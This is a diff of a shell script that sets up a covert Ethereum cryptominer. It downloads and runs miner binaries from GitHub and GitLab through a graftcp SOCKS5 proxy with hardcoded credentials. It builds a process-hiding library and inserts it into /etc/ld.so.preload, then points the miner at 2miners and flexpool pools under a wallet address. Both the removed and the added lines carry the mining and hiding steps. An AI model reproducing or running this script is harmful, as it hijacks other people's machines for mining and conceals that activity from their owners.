@@ -1,15 +1,11 @@
-#!/bin/bash
-cat << "EOF" > run.sh
-
-#!/bin/bash
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-npm i -g node-process-hider
+#!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
@@ -21,20 +17,32 @@ socks5_password = Elibawnos
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
 sleep .2
+
+echo " "
+echo " "
+
+echo "**"
+
 ./graftcp/graftcp curl ifconfig.me
+
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/145
-chmod +x 145
+echo "**"
 
-apt -y install shadowsocks-libev rng-tools
-ss-local -s 192.186.186.7 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
-ph add 145
-./145 --algo ETHASH --pool eth.2miners.com:2020 --user 0x9BACCB443D4EEe6831B541ac17c28C1b61FDaB81.$(echo "$(curl -s ifconfig.me)" | tr . _ )-monakis
-EOF
+echo " "
+echo " "
 
-chmod +x run.sh
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
 
-./run.sh
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bezzHash --url=ssl://0x9baccb443d4eee6831b541ac17c28c1b61fdab81.GUD@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
